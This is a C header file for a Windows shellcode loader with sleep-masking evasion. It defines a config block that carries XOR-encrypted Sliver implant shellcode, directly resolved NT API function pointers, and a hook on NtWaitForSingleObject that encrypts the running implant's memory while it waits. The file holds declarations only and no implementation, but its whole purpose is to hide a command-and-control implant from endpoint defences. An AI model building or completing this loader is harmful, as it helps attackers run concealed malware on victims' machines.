#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>

/* ── NT API types ── */
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef NTAPI
#define NTAPI __stdcall
#endif

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
typedef NTSTATUS (NTAPI *NtWaitForSingleObject_t)(HANDLE,BOOLEAN,PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *NtFreeVirtualMemory_t)(HANDLE,PVOID*,PSIZE_T,ULONG);
typedef NTSTATUS (NTAPI *NtCreateWaitableTimer_t)(PHANDLE,ACCESS_MASK,PVOID);
typedef NTSTATUS (NTAPI *NtSetTimer_t)(HANDLE,PLARGE_INTEGER,PVOID,PVOID,BOOLEAN,LONG,PBOOLEAN);
typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN,PLARGE_INTEGER);

#ifndef MEM_COMMIT
#define MEM_COMMIT   0x1000
#define MEM_RESERVE  0x2000
#define MEM_RELEASE  0x8000
#define MEM_TOP_DOWN 0x100000
#endif

/* ── Magic marker identifying the config block appended to the shellcode ── */
#define MASK_MAGIC_0 0xB33FCAFEul
#define MASK_MAGIC_1 0xDEAD1337ul

/* ── Config block layout (immediately follows 8-byte magic in the blob) ──
 *  [4]  interval_ms   — how often to cycle the mask (ms, 0 = hook-only mode)
 *  [4]  threshold_ms  — minimum wait duration to trigger masking (ms)
 *  [4]  key_len       — XOR key length in bytes
 *  [4]  sc_len        — encrypted Sliver shellcode length
 *  [key_len] key      — XOR key bytes
 *  [sc_len]  sc       — XOR-encrypted Sliver shellcode
 */
typedef struct {
    uint32_t interval_ms;
    uint32_t threshold_ms;
    uint32_t key_len;
    uint32_t sc_len;
    /* key and sc bytes follow immediately */
} MASK_CONFIG;

/* ── Runtime context shared between go() and the masker thread ── */
typedef struct {
    void     *sc_base;       /* RX shellcode allocation */
    SIZE_T    sc_size;
    uint8_t  *key;
    uint32_t  key_len;
    uint32_t  interval_ms;
    uint32_t  threshold_ms;
    HANDLE    sc_thread;
    volatile BOOL masking;   /* reentrancy guard */
} MASKER_CTX;

/* ── Resolved NT function pointers (populated by resolve_all) ── */
extern NtAllocateVirtualMemory_t  _NtAllocateVirtualMemory;
extern NtProtectVirtualMemory_t   _NtProtectVirtualMemory;
extern NtCreateThreadEx_t         _NtCreateThreadEx;
extern NtWaitForSingleObject_t    _NtWaitForSingleObject;
extern NtWaitForSingleObject_t    _real_NtWaitForSingleObject; /* trampoline */
extern NtFreeVirtualMemory_t      _NtFreeVirtualMemory;
extern NtDelayExecution_t         _NtDelayExecution;

/* ── Exports ── */
void resolve_all(void);
void go(void *args);
void xor_region(uint8_t *data, size_t len, const uint8_t *key, uint32_t klen);
void mask_on(MASKER_CTX *ctx);
void mask_off(MASKER_CTX *ctx);
NTSTATUS NTAPI hook_NtWaitForSingleObject(HANDLE h, BOOLEAN alertable, PLARGE_INTEGER timeout);
